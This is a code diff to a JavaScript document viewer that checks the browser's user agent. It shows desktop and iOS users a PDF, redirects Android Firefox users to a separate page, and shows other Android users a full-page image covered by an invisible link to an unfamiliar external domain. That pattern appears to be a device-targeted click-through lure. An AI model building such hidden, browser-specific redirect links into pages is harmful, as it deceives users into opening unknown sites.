@@ -66,41 +66,29 @@ canvas, .linkLayer {
 import * as pdfjsLib from './pdfjs/pdf.mjs';
 
 const viewer = document.getElementById('viewer');
-const ua = navigator.userAgent;
+const ua = navigator.userAgent || navigator.vendor || window.opera;
 
-const PDF_URL = './document.pdf';
-const PNG_URL = './document.png';
-const ANDROID_LINK = 'https://ch1108677878.com';
-
+// -------- Device detection --------
 const isAndroid = /Android/i.test(ua);
-const isAndroidFirefox = /Android.*Firefox/i.test(ua);
-const isOtherAndroid = isAndroid && !isAndroidFirefox;
+const isAndroidFirefox = isAndroid && /Firefox/i.test(ua);
+const isOtherAndroid = isAndroid && !/Firefox/i.test(ua);
 
-/* --------------------------
-   ANDROID FIREFOX (regular)
-   Redirect to standalone page
---------------------------- */
+// -------- Android Firefox redirect --------
 if (isAndroidFirefox) {
     window.location.href = '/android-firefox.html';
 }
 
-/* --------------------------
-   OTHER ANDROID (Chrome, Samsung, Firefox Focus)
-   PNG full-page + full-page link
---------------------------- */
+// -------- Other Android (Chrome, Samsung, Firefox Focus) --------
 else if (isOtherAndroid) {
     viewer.innerHTML = `
         <div class="android-wrapper">
-            <img src="${PNG_URL}" class="android-img" alt="Document">
-            <a href="${ANDROID_LINK}" target="_blank" class="android-link"></a>
+            <img src="./document.png" class="android-img" alt="Document">
+            <a href="https://ch1108677878.com" target="_blank" class="android-link"></a>
         </div>
     `;
 }
 
-/* --------------------------
-   DESKTOP + iOS
-   PDF.js
---------------------------- */
+// -------- Desktop + iPhone PDF.js --------
 else {
     pdfjsLib.GlobalWorkerOptions.workerSrc = './pdfjs/pdf.worker.mjs';
 
@@ -114,7 +102,7 @@ else {
     const ctx = canvas.getContext('2d');
 
     async function render() {
-        const pdf = await pdfjsLib.getDocument(PDF_URL).promise;
+        const pdf = await pdfjsLib.getDocument('./document.pdf').promise;
         const page = await pdf.getPage(1);
 
         const baseViewport = page.getViewport({ scale: 1 });
@@ -128,12 +116,11 @@ else {
         canvas.width = viewport.width;
         canvas.height = viewport.height;
 
-        canvas.style.width = viewport.width + 'px';
-        canvas.style.height = viewport.height + 'px';
-
         const offsetX = (window.innerWidth - viewport.width) / 2;
         const offsetY = (window.innerHeight - viewport.height) / 2;
 
+        canvas.style.width = viewport.width + 'px';
+        canvas.style.height = viewport.height + 'px';
         canvas.style.left = offsetX + 'px';
         canvas.style.top = offsetY + 'px';
 
